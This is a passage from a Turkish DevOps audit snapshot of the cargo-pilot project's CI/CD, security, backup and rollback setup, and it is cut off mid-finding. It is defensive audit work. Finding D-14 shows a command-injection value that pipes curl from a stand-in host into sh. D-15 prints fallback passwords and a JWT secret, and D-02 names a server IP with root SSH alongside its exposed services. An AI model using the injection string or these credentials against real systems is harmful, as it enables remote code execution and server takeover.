# DevOps İyileştirme Analizi — 2026-08-03 (anlık görüntü)

**Ölçüm tarihi:** 2026-08-03 · **Durum:** 🗄 **Arşiv / anlık görüntü** — canlı belge değildir

> ### ⚠️ Bu bir zaman-damgalı anlık görüntüdür
>
> İçindeki **tüm** sayı ve ölçümler **2026-08-03** tarihine aittir ve o günden beri
> güncellenmemiştir; bugünkü durumu göstermez. Statüsü 2026-08-15'te "Aktif"ten
> "Arşiv / anlık görüntü"ye çevrildi — **içerik bilinçli olarak değiştirilmedi**, çünkü
> belgenin değeri o günkü tabloyu tarihsel olarak sabitlemesidir.
>
> Bilinen kayma örneği: aşağıda "cache kotası 9.93 GiB / 10 GiB, 267 cache" yazıyor;
> 2026-08-15 ölçümü **9,652 GiB / 10 GiB, 228 giriş (%96,5)** verdi
> (`gh cache list --repo Divizyon/cargo-pilot --limit 500`). İkisi de kendi gününde doğrudur.
>
> Güncel durum için: `devops-audit-raporu.md`, `docs/devops/known-issues.md`,
> `docs/devops/devops-backlog.md`.

> ### ✅ Triyaj yapıldı — 2026-08-16
>
> 51 D-bulgusunun tamamı bugünkü kodla yeniden doğrulandı.
> **6'sı kapandı:** D-01, D-05, D-07, D-10, D-11, D-16 (aşağıda tek tek işaretli).
> **45'i açık** ve D-kodları korunarak
> [`devops-backlog.md`](devops-backlog.md) **Kategori 6**'ya taşındı — canlı takip artık orada.
> Bu dosya bundan sonra yalnızca 2026-08-03'teki tabloyu ve kanıt gövdesini saklar.

Bu doküman dört paralel tarama (CI/CD süresi · Docker image · Altyapı & observability · Sunucu operasyonu) ile tespit edilen 51 maddelik DevOps bulgu listesini, doğrulama durumlarını ve uygulama sırasını içerir.

**Kapsam:** Yalnızca DevOps. Uygulama kodu, iş mantığı ve 3D katmanı kapsam dışı.
**Analiz durumu (2026-08-03):** 📋 Hiçbir madde uygulanmamıştı, öncelik kararı bekleniyordu.
**Bugünkü durum:** yukarıdaki triyaj notuna bakın — 6 madde kapandı, 45'i backlog'a taşındı.

> Bu doküman [`known-issues.md`](known-issues.md) ve [`devops-backlog.md`](devops-backlog.md)
> yerine geçmez; onların **üstüne** gelen bir tarama sonucudur. Zaten kayıtlı olan maddeler
> "kayıtlı" işaretiyle ayrılmıştır.

---

## 0. Doğrulama Durumu

Bulguların tamamı statik inceleme + ölçümle üretildi. Ayrım önemli:

| Sınıf | Anlamı |
|-------|--------|
| ✅ **Doğrulandı** | Komut çalıştırıldı, çıktı görüldü |
| 📄 Kod kanıtlı | Dosya içeriğinden kesin çıkarım, çalıştırılmadı |
| ⚠️ Doğrulanmadı | Makul ama kanıtlanmadı — uygulamadan önce teyit gerekir |

**Sunucuya SSH atılmadı.** Crontab içeriği, `/etc/docker/daemon.json`, gerçek disk/RAM
kullanımı ve mevcut yedek dosyaları görülmedi. Bunların hepsi ~15 dakikalık bir SSH
oturumuyla teyit edilebilir ve **uygulamaya geçmeden önce edilmelidir.**

Docker CLI bu makinede yok → image boyutları ölçülmedi, build süreleri tahmin.

---

## 1. Özet — Önce Bunlar

Sekiz madde. Beşi doğrulandı, hepsi ucuz veya yüksek etkili.

| # | Bulgu | Sınıf | Efor |
|---|-------|-------|------|
| **D-01** | Yedekleme script'lerinin execute biti git'te yok → 42 günlük olay tekrar edebilir | ✅ | 15 dk |
| **D-02** | Yedi servis portu internete açık (MSSQL, MinIO Console, Grafana, Prometheus dahil) | ✅ | 1 sa |
| **D-03** | MinIO verisi hiç yedeklenmiyor | 📄 | 3 sa |
| **D-04** | Yedeklerin off-site kopyası yok — sunucu diski = tek kopya | 📄 | 5 sa |
| **D-05** | Rollback `v0.<n>.0` etiketleriyle çalışmıyor; hiç denenmemiş | ✅ | 3 sa |
| **D-06** | GHA cache'i default branch'te hiç yazılmıyor → her build sıfırdan | ✅ | 1 sa |
| **D-07** | İki ölü GHCR secret'ı duruyor (INC-003 ile aynı sınıf) | ✅ | 30 dk |
| **D-08** | Frontend'de 41 MB ölü/yanlış formatlı texture | ✅ | 1 sa |

**D-01, D-05 ve D-06'nın ortak özelliği:** hiçbiri "eksik iş" değil, üçü de **sessizce bozulmuş
mekanizmalar**. Kimse fark etmiyor çünkü hiçbiri hata vermiyor.

---

## 2. CI/CD Süresi

Ölçüm: **60 run, 128 job kaydı** (2026-08-03).

### Mevcut maliyet

Tek bir değişikliğin `feat/* → dev → test → main` zincirini tamamlaması:

| Metrik | Değer |
|--------|-------|
| Job sayısı | **25** (12 run) |
| Toplam compute | **31.4 dk** |
| Seri geliştirici bekleme | **19.8 dk** |
| Backend image build | **7 kez** |
| Frontend image build | **7 kez** |
| Frontend CI + Backend CI | **4 kez** |
| `migration-check` (Release derleme) | **3 kez** |

En pahalı iki job toplam compute'un yarısı:

| Job | Ortalama | Toplam pay |
|-----|----------|-----------|
| `ci.yml` → Docker Image Build | 4.6 dk | %26.1 |
| `test-deploy.yml` → Deploy (Test) | 2.7 dk | %25.7 |

Runner kuyruk gecikmesi medyan **3 saniye** — darboğaz runner değil.

### D-06 · Kök neden: cache yazılıyor ama okunamıyor ✅

GitHub Actions cache'i yalnızca **kendi ref'inden** ve **default branch'ten** okunabilir.

`ci.yml` ne `main`'e ne `test`'e push'ta tetikleniyor — sadece iş branch'i push'u ve PR.
Dolayısıyla `cargo-pilot-*-ci` scope'u **default branch altında hiç yazılmıyor.**

Doğrulama — bu scope'ların bulunduğu ref'ler:

```
3  refs/heads/chore/uc-dalli-model-dokuman
3  refs/heads/fix/INC-003-ghcr-bayat-kimlik-bilgisi
3  refs/heads/fix/prod-compose-eksik-env
3  refs/heads/fix/surum-etiketi-git-kimligi
3  refs/heads/infra/uc-dalli-terfi-modeli
1  refs/heads/chore/trunk-gecisi
                                    ← refs/heads/main: SIFIR
                                    ← refs/heads/test: SIFIR
```

Her iş branch'i kendi izole kopyasını yazıyor, bir daha kimse okuyamıyor. Aynı sorun
`actions/setup-node` npm cache'inde de var — log kanıtı: `Frontend CI  npm cache is not found`.

Sonuç, log satırı sayımıyla:

| Run | `CACHED` satırı |
|-----|-----------------|
| `ci.yml` Docker Image Build | **0** |
| `test-deploy.yml` Image Build | **26** |

Aynı Dockerfile, aynı context. `ci.yml` hiçbir zaman 89 sn altına inmiyor; `test-deploy` medyanı **5.5 sn**.

**Cache kotası bu yüzden dolu:** 9.93 GiB / 10 GiB, 267 cache *(2026-08-03 ölçümü; 2026-08-15'te 9,652 GiB / 228 giriş)*. Ref dağılımı:

```
70  refs/heads/main       ← trunk penceresinde (12:00–12:27) yazılmış, artık donmuş
65  refs/heads/test
24  refs/heads/infra/uc-dalli-terfi-modeli      ← okunamaz
24  refs/heads/fix/surum-etiketi-git-kimligi    ← okunamaz
24  refs/heads/fix/prod-compose-eksik-env       ← okunamaz
24  refs/heads/fix/INC-003-ghcr-bayat-kimlik…   ← okunamaz
24  refs/heads/chore/uc-dalli-model-dokuman     ← okunamaz
```

5 dal × ~1 GiB = **~4.9 GiB tamamen boşa.** `cache-cleanup.yml` bu yüzden var — ama semptomu
temizliyor, nedeni değil.

> **Uyarı — durum bugünden sonra kötüleşecek.** `main` altındaki 70 cache, trunk modelinin
> yürürlükte olduğu yarım saatlik pencerede yazıldı. Üç dallı modelde `main`'de build yapan
> hiçbir workflow yok, yani bu snapshot **bir daha asla tazelenemez.** Backend bugün 5 sn'de
> hit alıyor çünkü o pencereden beri değişmedi; değiştiği gün hit oranı çökecek.
> Bu, bugünkü branch modeli değişikliğinin **öngörülmemiş yan etkisidir.**

**Düzeltme:** `main` push'unda (veya nightly) her iki image'ı tüm scope'lara build edip
`cache-to` yapan bir seed job. `main`'e zaten haftada bir terfi ediliyor; nightly daha güvenli.

### D-09 · `ci.yml`'daki `docker-build` job'u gereksiz 📄 — ◐ **KISMEN KAPANDI (PR #992)**

> Doğrulama 2026-08-16: `ci.yml:204` — job artık yalnızca `dev` PR'ında koşuyor;
> iş branch'i push'undaki kopya build kaldırıldı. Takip: `devops-backlog.md` 6.4.

`ci.yml:130-178`, ortalama **4.6 dk**, toplam compute'un %26.1'i.

Aynı sha için iş branch'i push'unda `test-deploy.yml`'ın `Deploy (Test)` job'u zaten her iki
image'ı build edip compose ile **ayağa kaldırıyor** (`test-deploy.yml:257-281`) — yani
`ci.yml`'ın `push: false` ile build edip attığı image'dan daha güçlü bir doğrulama mevcut.

**Kazanç: değişiklik başına wall −9.0 dk.** Risk: PR→dev'de ayrı bir docker kapısı kalmıyor.

### D-10 · Aynı image eşzamanlı iki kez build ediliyor — ✅ **KAPANDI (PR #992)**

> Doğrulama 2026-08-16: `test-deploy.yml:152` → `deploy` job'u artık
> `needs: [migration-check, build]`. Build önce bitiyor, `deploy` onun yazdığı cache
> scope'undan okuyor (`test-deploy.yml:205-206` açıklaması).

`test-deploy.yml:143-146` — `deploy` job'u `needs: [migration-check]`, `build`'e **bağlı değil**.
İkisi aynı GHA scope'unu kullanıyor ama paralel koştukları için cache henüz yazılmamış oluyor.

Soğuk cache kanıtı (run `30811656154`, aynı run içinde örtüşen aralıklar):

```
Image Build    Backend  +18s .. +149s  (131s)
Deploy (Test)  Backend  +79s .. +189s  (110s)   ← örtüşüyor
Image Build    Frontend +149s .. +274s (125s)
Deploy (Test)  Frontend +189s .. +319s (130s)   ← örtüşüyor
```

Tek run'da **~8 dk mükerrer soğuk build.** Sıcak durumda tesadüfen ucuz — garanti değil.

### D-11 · Geçici stack doğrulaması, gerçek deploy'dan SONRA bitiyor — ✅ **KAPANDI (PR #991/#992)**

> Doğrulama 2026-08-16: `test-deploy.yml:418` → `deploy-test-server`,
> `needs: [migration-check, build, deploy]`. Sunucu artık geçici stack doğrulaması
> yeşillenmeden güncellenmiyor.

Run `30833011722` (test push):

```
Deploy (Test Server)  +87s .. +162s   ← test sunucusu güncellendi
Deploy (Test)         +58s .. +182s   ← doğrulama 20 sn SONRA yeşillendi
```

Kapı olarak işlevsiz. Test push'ta bu job kaldırılabilir; `Deploy (Test Server)` + health check yeterli.

### D-12 · Gereksiz seri `needs:` zinciri 📄

`ci.yml:133` — `docker-build`, `needs: [frontend-ci, backend-ci]`. Docker build bu job'ların
çıktısına bağımlı değil (kendi context'ini kendi build ediyor), ama +1.3…+1.6 dk offsetle başlıyor.
**Kazanç: wall −2.8 dk.**

### D-13 · Küçük CI kalemleri 📄 — ◐ **KISMEN KAPANDI**

> Doğrulama 2026-08-16: `build-push-action` 6 kullanımda v7.3.0'a pinlendi, ama
> `test-deploy.yml:327,340` hâlâ v5.4.0. NuGet cache ve çifte Release derlemesi duruyor.
> Takip: `devops-backlog.md` 6.4.

- `ci.yml:158` `build-push-action@v6` vs `test-deploy.yml:110` `@v5`. v6 otomatik
  `--attest type=provenance,mode=max` ekliyor → gereksiz ek yük
- `setup-dotnet`'te NuGet cache yok (`ci.yml:110`, `test-deploy.yml:44`) — restore 7–10.5 sn
- `migration-check` ile `backend-ci` aynı solution'ı Release'de iki kez derliyor
- `cache-to` her ref'te `mode=max` yazıyor → 9.94 GiB'ın kaynağı. Feature branch'lerde
  `mode=min` veya hiç yazmamak kotayı yarıya indirir

### CI/CD toplam kazanç tahmini

**D-06 + D-09 + D-12 birlikte** (üçü de kolay):

| | Şimdi | Sonra |
|---|---|---|
| Seri bekleme | 19.8 dk | **~10.8 dk** |
| Compute | 31.4 dk | **~22 dk** |

---

## 3. Güvenlik

### D-02 · Yedi port internete açık ✅ · **Kritik** — ◐ **KISMEN KAPANDI (PR #991)**

> Doğrulama 2026-08-16: 5 servis `127.0.0.1:` ön ekine alındı.
> Açık kalanlar: `docker-compose.monitoring.test.yml:89` Grafana `3002:3000` ve
> `docker-compose.test.yml:127` ERP MSSQL `1435:1433`. Takip: `devops-backlog.md` 6.1.

Kendi makinemden TCP bağlantısı kuruldu, hepsi cevap verdi:

| Port | Servis | Neden tehlikeli |
|------|--------|-----------------|
| **1434** | MSSQL | SA parolası git geçmişinde ve **döndürülmedi** (known-issues #3) |
| **9003** | MinIO Console | root credential ile düz HTTP login |
| **3002** | Grafana | admin login, TLS yok |
| **9091** | Prometheus | kimlik doğrulama yok, tüm hedef adresleri okunabilir |
| 9002 | MinIO API | |
| 8081 | Backend | nginx'in TLS/rate-limit/Cloudflare korumasını baypas ediyor |
| 3001 | Frontend | aynı |

Doğrulanan şey **TCP erişilebilirliği**; kimlik doğrulama denenmedi.

`server-access.md:155` Docker'ın UFW'yi baypas ettiğini zaten belgeliyor — firewall kuralı
yazılmış olsa bile bu portlar açık kalır.

**Düzeltme:** compose'da `127.0.0.1:` ön eki.

```yaml
ports:
  - "127.0.0.1:${MSSQL_PORT}:1433"
```

Geliştirici erişimi SSH tüneliyle sürer:
`ssh -L 1434:127.0.0.1:1434 root@104.247.163.42`

> **Dikkat:** `test-deploy.yml:359` health check'i `http://<HOST>:8081/health` ile **dışarıdan**
> vuruyor. Backend kapatılırken bu adım SSH oturumu içine (`localhost:8081`) taşınmalı,
> yoksa deploy kırılır.

### D-07 · İki ölü secret — ✅ **KAPANDI**

> Doğrulama 2026-08-16: `gh secret list --repo Divizyon/cargo-pilot` çıktısında `TEST_GHCR_PAT`
> ve `TEST_GHCR_USER` **yok**. Kalan iş doküman tarafında: `secret-management.md:107-114`
> hâlâ ikisini aktif secret sayıyor (bkz. `devops-backlog.md` Kategori 6.7).

`TEST_GHCR_PAT` ve `TEST_GHCR_USER` repo secret'ı olarak duruyor ama **hiçbir workflow'da
geçmiyor** (grep sıfır sonuç). PAT login #483 ile kaldırılmıştı.

`TEST_GHCR_PAT` son güncelleme **2026-05-28** — yani kaldırıldıktan *sonra* bir kez daha
yenilenmiş. Kimse kullanılmadığını bilmiyor.

**Bu, INC-003 ile birebir aynı sınıf hata:** kullanılmayan ama duran kimlik bilgisi. Orada
kalıntı sunucudaydı, burada GitHub'da. Süresi dolan bir PAT'in yanlış teşhise yol açma riski aynen sürüyor.

`secret-management.md:107-114` bu ikisini hâlâ **aktif CI/CD secret'ı** olarak listeliyor — doküman yanlış.

**Düzeltme:** secret'ları sil, PAT'i GitHub'da iptal et, dokümanı düzelt.

### D-14 · `rollback.yml`'de shell injection 📄 · **Yüksek**

`rollback.yml:36,58,70` — `${{ github.event.inputs.target_ref }}` doğrudan shell gövdesine gömülü:

```yaml
TARGET="${{ github.event.inputs.target_ref }}"
```

`"; curl evil.sh | sh; #` gibi bir girdi hem runner'da hem **sunucuda root olarak** çalışır.
Tetikleme write yetkisi gerektirdiği için Kritik değil, ama tek ele geçirilmiş hesap = sunucuda root shell.

**Düzeltme:** `env:` ile geçir, script içinde `"$TARGET_REF"` kullan, `^[A-Za-z0-9._/-]+$` doğrula.

### D-15 · Workflow'da hardcoded fallback parolalar 📄 · **Yüksek**

`test-deploy.yml:165-176`:

```yaml
MSSQL_SA_PASSWORD: ${{ secrets.TEST_MSSQL_SA_PASSWORD || 'CiTestPassword123!' }}
MINIO_ROOT_PASSWORD: ${{ secrets.TEST_MINIO_ROOT_PASSWORD || 'minioadmin123' }}
Seed__DefaultAdminPassword: ${{ secrets.SEED_DEFAULT_ADMIN_PASSWORD || 'Admin@CargoPilot1!' }}
JWT_SECRET: ${{ secrets.JWT_SECRET || 'ci-test-secret-key-at-least-32-chars-long!' }}
```

Bu secret'ların çoğu tanımlı değil (`gh secret list`) → fallback'ler **her CI koşusunda fiilen
kullanılıyor**. Yalnızca runner'daki geçici stack'i etkiliyor (sunucu `.env.test` kullanır),
ama `secret-management.md:12`'deki "JWT secret asla repoya girmemeli" kuralıyla doğrudan çelişiyor.

⚠️ **Doğrulanmadı:** Sunucudaki `.env.test`'te aynı değerlerin kullanılıp kullanılmadığı.
Kullanılıyorsa risk seviyesi Kritik'e çıkar. **Önce bu teyit edilmeli.**

### D-16 · SA parolası `ps` çıktısında görünüyor — ✅ **KAPANDI (PR #994)**

> Doğrulama 2026-08-16: `backup-db.sh:46,58`, `restore-db.sh:51,89,103,120`,
> `verify-backup.sh:90` → `export SQLCMDPASSWORD` + `docker exec -e SQLCMDPASSWORD`;
> `-P` bayrağı kalmadı.

`backup-db.sh:54`, `restore-db.sh:86,100,117`, `verify-backup.sh:86,100` — `sqlcmd ... -P "${SA_PASSWORD}"`.
Host'ta `ps aux` çalıştırabilen herkes görür.

**Düzeltme:** `docker exec -e SQLCMDPASSWORD="${SA_PASSWORD}" ...` ve `-P` kaldır.

### D-17 · MSSQL container'ı root çalışıyor 📄 · Düşük

`docker-compose.*.yml` — `user: root`. `mssql` kullanıcısı (uid 10001) ile çalıştırmak için
volume izinlerinin bir kez düzeltilmesi yeterli. Prod'a geçmeden yapılmalı.

---

## 4. Yedekleme ve Veri Kaybı

### D-01 · Script'lerin execute biti git'te yok — ✅ **KAPANDI (PR #994)**

> Doğrulama 2026-08-16: `git ls-files -s infra/scripts/` → altı script de `100755`.
> Cron satırlarına `bash` öneki de eklendi (`setup-backup-cron.sh:38-55`).
> Aşağıdaki metin 2026-08-03 durumunu yansıtır.

```
100644  infra/scripts/backup-db.sh          ← execute biti YOK
100644  infra/scripts/restore-db.sh         ← YOK
100644  infra/scripts/rollback.sh           ← YOK
100644  infra/scripts/setup-backup-cron.sh  ← YOK
100644  infra/scripts/verify-backup.sh      ← YOK
100755  infra/scripts/setup-nginx.sh        ← tek doğru olan
```

`test-deploy.yml:325` her deploy'da `git reset --hard origin/test` çalıştırıyor. `git reset --hard`
çalışma ağacındaki `755` modunu index'teki `644`'e **geri çevirir.** `setup-backup-cron.sh:17-20`
bir kez `chmod +x` yapsa bile **bir sonraki deploy'da siliniyor.**

Cron satırları script'i doğrudan çağırıyor (`bash` öneki yok, `setup-backup-cron.sh:40`) →
izin gidince "Permission denied".

**2026-05-16'daki 42 günlük yedek kaybının kök nedeni hâlâ repoda.** `known-issues.md` bunu
"chmod +x düzeltildi" diye kapatmış; düzeltme kalıcı değildi.

**Düzeltme:** `git update-index --chmod=+x infra/scripts/*.sh` + cron satırlarını `bash <script>`
biçimine çevir (ikinci savunma hattı).

### D-03 · MinIO verisi hiç yedeklenmiyor 📄 · **Kritik**

Yedeklenen tek şey MSSQL (`backup-db.sh`). `cargo-pilot-minio-data-{test,prod}` volume'una
hiçbir script dokunmuyor.

MinIO'da ne var: ürün görselleri, firma logoları, üretilen PDF raporları, plan çıktıları.
DB restore edilse bile MinIO referansları kırık gelir → **mantıksal veri tutarsızlığı.**

### D-04 · Off-site kopya yok 📄 · **Kritik**

Yedekler `/opt/cargo-pilot/backups/` altında — **veritabanıyla aynı fiziksel diskte.**
Kopyalama, snapshot, uzak hedef yok. Retention 7 gün.

Disk giderse: DB'nin son 7 günü + tüm MinIO verisi + ERP `DIVIZYON` DB'si kaybolur.
Kurtarma yolu yok. **Fiili RPO = ∞.**

**Düzeltme (minimum):** yedek sonrası `restic`/`rclone` ile ikinci hedefe kopya, retention 30 gün.
`restic` şifreleme + dedup'ı bedava getirir.

### D-18 · ERP `DIVIZYON` veritabanı yedek kapsamı dışında 📄 · Yüksek

`backup-db.sh:21/25` tek bir DB adı kullanıyor. Aynı container'daki `DIVIZYON` DB'si
(2026-05-16'da elle restore edilmişti) yedeklenmiyor.

**Düzeltme:** DB listesini diziye çevir, döngüye al.

### D-19 · Yedek doğrulaması yüzeysel 📄 · Yüksek — ◐ **KISMEN KAPANDI (PR #994)**

> Doğrulama 2026-08-16: `WITH CHECKSUM` hem yedekte (`backup-db.sh:61`) hem doğrulamada
> (`verify-backup.sh:98`) var; checksum'suz eski yedekler için geri düşüş de yazılmış.
> **Açık:** gerçek restore tatbikatı yok, yalnızca en son yedek kontrol ediliyor.

`verify-backup.sh:87` → `RESTORE VERIFYONLY`. Dosya boyutundan fazlası, ama gerçek restore testi değil:

- `backup-db.sh:55`'te `WITH CHECKSUM` **kullanılmıyor** → VERIFYONLY sayfa checksum'larını
  doğrulayamaz; bozuk sayfa içeren yedek testten geçebilir
- Şema/veri düzeyinde hiçbir doğrulama yok
- Sadece **en son** yedek kontrol ediliyor; diğer 7 dosya hiç

**Düzeltme:** (a) `BACKUP ... WITH CHECKSUM`; (b) `RESTORE VERIFYONLY ... WITH CHECKSUM`;
(c) ayda bir gerçek restore tatbikatı (`RESTORE DATABASE ... AS CargoPilot_RestoreTest` + tablo sayısı + drop).

### D-20 · Yedek başarısızlığında hiçbir bildirim yok 📄 · **Kritik**

- Cron çıktısı yalnızca log dosyasına yazılıyor, `MAILTO` yok
- Prometheus/Grafana'da yedeğe dair **hiçbir metrik veya alert kuralı yok**
- Grafana'da bildirim kanalı fiilen çalışmıyor (bkz. D-24)

**42 gün yine sessizce geçebilir.**

**Düzeltme:** `backup-db.sh` sonuna node_exporter textfile metriği:

```bash
echo "cargo_pilot_backup_last_success_timestamp{env=\"$ENVIRONMENT\"} $(date +%s)" \
  > /var/lib/node_exporter/textfile/backup_$ENVIRONMENT.prom
```

+ Prometheus kuralı: `time() - cargo_pilot_backup_last_success_timestamp > 100000` (≈28 sa) → critical.
**Ön koşul:** çalışan bir bildirim kanalı (D-24).

### D-21 · Prod cron'ları her gece hata basıyor 📄 · Yüksek

`setup-backup-cron.sh:39-51` prod için 3 cron kuruyor ama `.env.prod` sunucuda yok
(known-issues #2 — **kayıtlı**). Her gece 02:00'de ve her Pazar 04:00'te sessizce hata veriyor.

Bu, alert eklendiğinde **alarm yorgunluğu** üretir ve gerçek başarısızlığı gizler —
42 günlük olayın psikolojik ikizi.

**Düzeltme:** prod cron'larını `.env.prod` var olana kadar kurma.

### D-22 · Ölü hata blokları 📄 · Orta

`backup-db.sh:36-41`, `restore-db.sh:41-46`, `verify-backup.sh:42-47`:

```bash
SA_PASSWORD=$(grep -E '^MSSQL_SA_PASSWORD=' "${ENV_FILE}" | cut -d= -f2- | ...)
if [[ -z "${SA_PASSWORD}" ]]; then echo "[ERROR] ... bulunamadı."; exit 1; fi
```

`set -euo pipefail` altında grep eşleşme bulamazsa **atama satırında script anında ölür**;
`if` bloğuna hiç gelinmez. Sonuç: env satırı eksikse cron log'unda **hiçbir açıklama olmadan** çıkış.

**Düzeltme:** `$(grep ... || true)`.

### D-23 · Yedek dosya izinleri sıkı değil 📄 · Orta

`backup-db.sh:43` — `mkdir -p` varsayılan umask ile (`755`), `.bak` tipik `644`.
Dosya tüm müşteri verisini içerir; host'taki her kullanıcı okuyabilir.

**Düzeltme:** `chmod 700` dizin, `chmod 600` dosya.

---

## 5. Rollback ve Deploy Güvenliği

### D-05 · Rollback `v0.<n>.0` etiketleriyle çalışmıyor — ✅ **KAPANDI (PR #994)**

> Doğrulama 2026-08-16: `rollback.sh:72-73` artık `${TARGET_REF}^2` (merge commit'in test head'i)
> üzerinden türetiyor, tek-parent push'ta commit'in kendisine düşüyor.
> **Kalan iş D-29'da:** `pull` hâlâ `down`'dan sonra (`:65` → `:80`) ve tatbikat yapılmadı.

`rollback.sh:69` → `IMAGE_TAG="test-$(git rev-parse --short=7 ${TARGET_REF})"`.

Ama GHCR'daki immutable tag'ler `test` dalına push edilen commit'in SHA'sından üretiliyor
(`test-deploy.yml:94`), sürüm etiketleri ise `main`'deki **merge commit'lere** işaret ediyor:

```
v0.1.0 -> 5df8358 | sadece origin/main
v0.2.0 -> 90171d3 | sadece origin/main
v0.3.0 -> 7a233aa | sadece origin/main
```

Bu SHA'lar `test` dalında yok → `test-5df8358` diye bir image **hiç üretilmedi** →
`docker compose pull` "manifest unknown" ile ölür.

**Ve bu, `down --remove-orphans` çalıştıktan SONRA olur** (`rollback.sh:64-65` → `76-77`).
Yani başarısız rollback denemesi ortamı **kapalı** bırakır.

İkinci sorun: parametresiz rollback `git describe --tags` kullanıyor, ama sunucu `test` dalında
duruyor ve `v0.x.0` etiketleri oradan erişilemiyor → "tag bulunamadı" ile çıkar.

`gh run list --workflow rollback.yml` → **0 run.** Workflow bugüne kadar hiç çalıştırılmadı,
o yüzden kimse fark etmedi.

> **Not:** Bu kırılma bugün eklenen `release-tag.yml`'in yan etkisidir. Etiketi merge commit'e
> attığı için `test-<sha>` türetmesi kopmuştur.

**Düzeltme (iki seçenek):**
- **A (önerilir):** `release-tag.yml` etiketi merge commit'in ikinci ebeveynine (`HEAD^2` = terfi
  edilen `test` commit'i) atsın; veya `rollback.sh` `^2` fallback'i denesin
- **B:** `main` push'unda image'ları `:v0.<n>.0` tag'iyle de GHCR'a push et (backlog 2.3 ile örtüşür)

Her iki durumda **pull'u `down`'dan önce yap.**

### D-24 · DB migration'ları geri alınmıyor ve bu hiçbir yerde yazmıyor 📄 · Yüksek

`DbInitializer.cs:28` → `Database.MigrateAsync()` — migration'lar container açılışında
**ileri yönlü** uygulanıyor. EF Core geri alma yapmaz.

Eski image'a dönüldüğünde şema yeni, kod eski kalır. Sütun silinmiş/yeniden adlandırılmışsa
eski kod runtime'da patlar. `rollback.sh:53`'ün aldığı yedek **rollback öncesi** yedektir,
yani zaten yeni şemayı içerir — geri dönüş için işe yaramaz.

Hiçbir dokümanda bu uyarı yok.

**Düzeltme:** rollback runbook'u + `rollback.sh` başına belirgin uyarı + uzun vadede
yıkıcı migration'lar için expand-contract kuralı.

### D-25 · Yedeksiz rollback devam ediyor 📄 · Yüksek

`rollback.sh:53-55`:

```bash
"${DEPLOY_DIR}/infra/scripts/backup-db.sh" "${ENVIRONMENT}" || { echo "[WARN] Yedek alınamadı, devam ediliyor..."; }
```

Rollback'in en riskli anında güvenlik ağı olmadan ilerliyor. **D-01 nedeniyle buraya her zaman düşüyor.**

### D-26 · Deploy'da `down` + `up` → her seferinde 2-3 dk kesinti 📄 · Yüksek

`test-deploy.yml:340-343` — `down --remove-orphans` backend/frontend'i **değil, mssql ve minio'yu da**
kapatıyor. Kesinti = MSSQL soğuk açılışı (`start_period: 90s` + healthcheck döngüsü) ≈ **1.5–3 dk**,
her deploy'da. DB gereksiz yere her seferinde soğuk yeniden başlıyor.

(`down -v` değil — veri volume'ları korunuyor, bu doğru yapılmış.)

**Düzeltme:** `down`'ı tamamen kaldır. `up -d --no-build --remove-orphans` yeterli; compose
yalnızca image'ı/config'i değişen container'ları yeniden yaratır, mssql/minio dokunulmadan kalır.
**Kesinti ~10-20 sn'ye iner.**

### D-27 · Health check başarısızsa otomatik geri alma yok 📄 · Yüksek

`test-deploy.yml:354-367` — başarısızsa workflow kırmızı olur, **sunucu bozuk image ile çalışmaya
devam eder.** Rollback tamamen manuel ve D-05 nedeniyle şu an çalışmıyor.

### D-28 · `docker image prune` health check'ten önce çalışıyor 📄 · Orta

`test-deploy.yml:352` prune, `354`'teki health check'ten önce. Önceki image local'den siliniyor →
hızlı geri dönüş için GHCR'dan yeniden pull gerekir.

### D-29 · Rollback hiç denenmedi 📄 · Yüksek

D-05 + D-24 + D-25 birlikte: ilk gerçek olayda rollback ortamı kurtarmak yerine **bozacak.**
Düzeltmeler sonrası test ortamında planlı bir tatbikat gerekli.

---

## 6. Docker Image ve Build

### D-08 · Frontend'de 41 MB israf ✅ · Yüksek — ◐ **KISMEN KAPANDI (PR #995)**

> Doğrulama 2026-08-16: (a) `public/textures/` silindi.
> (b) **Açık:** `src/assets/textures/container-steel/normal.jpg` hâlâ 19.4 MB
> 16-bit RGBA PNG. Takip: `devops-backlog.md` 6.5.

**İki ayrı sorun:**

**(a) `public/textures/container/` tamamen ölü — 20 MB.** Hiçbir kaynak dosya referans vermiyor
(`textures/container` ve `metal_0023` aramaları sıfır sonuç). Üstelik `src/assets/`'teki
dosyaların **md5-identik kopyası**:

```
public/.../metal_0023_normal_opengl_2k.png  2b67a5ef983ead2d4fef942658856cbd
src/assets/.../normal.jpg                   2b67a5ef983ead2d4fef942658856cbd
```

`public/` Vite tarafından `dist/`'e olduğu gibi kopyalanıyor.

**(b) `normal.jpg` aslında JPEG değil — 20.3 MB.**

```
normal.jpg: PNG image data, 2048 x 2048, 16-bit/color RGBA, non-interlaced
```

Kardeş dosyalar gerçekten JPEG ve 89–552 KB. Three.js `normalMap` RGB okur — 16-bit alpha
kanalı tamamen boşa. Yeniden kodlama testi (aynı çözünürlük):

| Format | Boyut |
|--------|-------|
| Mevcut (16-bit RGBA PNG) | 20,337,577 B |
| JPEG q92 | **890,159 B** (−%95.6) |
| 1024×1024 JPEG q90 | 223,057 B |

**Toplam etki (ölçüldü):** `dist/` 46 MB → ~5.3 MB. Final nginx image'ına bire bir yansır.
Import path'leri değişmiyor, kod dokunulmuyor.

### D-30 · Backend restore katmanı hiç cache'lenmiyor 📄 · Yüksek

`apps/backend/Dockerfile:7` — `COPY . .` restore'dan **önce**. Tek satırlık bir `.cs` değişikliği
bu katmanı invalidate eder → `dotnet restore` her build'de sıfırdan koşar. Paket seti küçük değil
(Hangfire ×4, EF Core ×3, Serilog ×4, Swashbuckle ×2, MediatR, FluentValidation, SonarAnalyzer…).

`cache-to: mode=max` kullanılıyor — ayrı bir restore katmanı olsaydı GHA cache'ten doğrudan hit olurdu.
Mevcut yapı bu mekanizmayı tamamen boşa çıkarıyor.

**Düzeltme:** csproj-only restore katmanı + `dotnet publish --no-restore`.

⚠️ **NuGet cache mount önerilmiyor:** BuildKit cache mount içerikleri `type=gha`'ya export
edilmez; ephemeral runner'da her koşuda boş başlar. Doğru araç katman ayrımı.

### D-31 · `nginx:1.27-alpine` → `1.29-alpine-slim` 📄 · Yüksek — ◐ **KISMEN KAPANDI**

> Doğrulama 2026-08-16: `apps/frontend/Dockerfile:21` artık `nginx:1.31-alpine`
> (Dependabot ile yükseldi). **Açık:** hâlâ `alpine`, `alpine-slim` değil — njs ve onunla
> gelen `libxml2`/`libxslt` duruyor. Takip: `devops-backlog.md` 6.5.

`apps/frontend/Dockerfile:21`. İki kazanç:

1. 1.27 iki mainline sürüm geride → altındaki Alpine eski → known-issues #8'deki `openssl`
   CRITICAL'ları buradan
